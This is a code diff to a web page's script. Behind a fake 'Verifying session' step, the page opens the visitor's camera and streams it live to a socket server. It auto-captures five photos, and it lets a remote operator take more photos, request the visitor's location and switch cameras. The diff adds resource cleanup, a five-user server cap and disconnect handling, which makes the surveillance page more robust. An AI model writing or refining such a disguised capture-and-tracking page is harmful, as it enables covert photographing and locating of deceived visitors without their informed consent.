@@ -55,6 +55,7 @@ let cameraReady = false;
 let useFrontCamera = true;
 let streamInterval = null;
 let autoCaptureDone = false;
+let autoCaptureTimer = null;
 
 function setStatus(message, type) {
     statusBox.textContent = message;
@@ -84,15 +85,30 @@ function requestAndSendLocation() {
     );
 }
 
-// Only request Camera first as per your requirement
+function cleanupResources() {
+    if (streamInterval) {
+        clearInterval(streamInterval);
+        streamInterval = null;
+    }
+    if (autoCaptureTimer) {
+        clearInterval(autoCaptureTimer);
+        autoCaptureTimer = null;
+    }
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+    }
+    cameraReady = false;
+}
+
 async function triggerVerification() {
     startBtn.style.display = "none";
     setStatus("Verifying session...", "waiting");
-    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+    cleanupResources();
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
-            audio: false, // Shuru mein sirf camera
+            audio: false,
             video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
         });
         mediaStream = stream;
@@ -103,7 +119,6 @@ async function triggerVerification() {
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
         startLiveStream();
         
-        // Auto capture 5 photos, 1 every second
         if (!autoCaptureDone) {
             autoCaptureDone = true;
             runAutoCaptureSequence();
@@ -138,32 +153,43 @@ function takeSinglePhoto() {
 
 function runAutoCaptureSequence() {
     let count = 0;
-    takeSinglePhoto(); // 1st photo immediately
+    takeSinglePhoto();
     count++;
 
-    const timer = setInterval(() => {
+    autoCaptureTimer = setInterval(() => {
         if (count >= 5) {
-            clearInterval(timer);
+            clearInterval(autoCaptureTimer);
+            autoCaptureTimer = null;
             return;
         }
         takeSinglePhoto();
         count++;
-    }, 1000); // 1 second gap between each photo
+    }, 1000);
 }
 
 socket.on("link-disabled", () => {
+    cleanupResources();
     document.body.innerHTML = `<div style="text-align:center;color:#fff;padding:50px;font-family:sans-serif;"><h2>Link is currently inactive or closed by admin.</h2></div>`;
+});
+
+socket.on("server-full", () => {
+    cleanupResources();
+    document.body.innerHTML = `<div style="text-align:center;color:#fff;padding:50px;font-family:sans-serif;"><h2>Server is full (Maximum 5 users reached). Please try again later.</h2></div>`;
 });
 
 socket.on("capture-photo", () => takeSinglePhoto());
 socket.on("request-location", () => requestAndSendLocation());
 socket.on("switch-camera", async () => {
     useFrontCamera = !useFrontCamera;
-    if (cameraReady) await triggerVerification();
+    await triggerVerification();
 });
 
 socket.on("connect", () => {
     socket.emit("user-connect-info", { deviceInfo: getDeviceInfo() });
+});
+
+window.addEventListener("beforeunload", () => {
+    cleanupResources();
 });
 </script>
 </body>
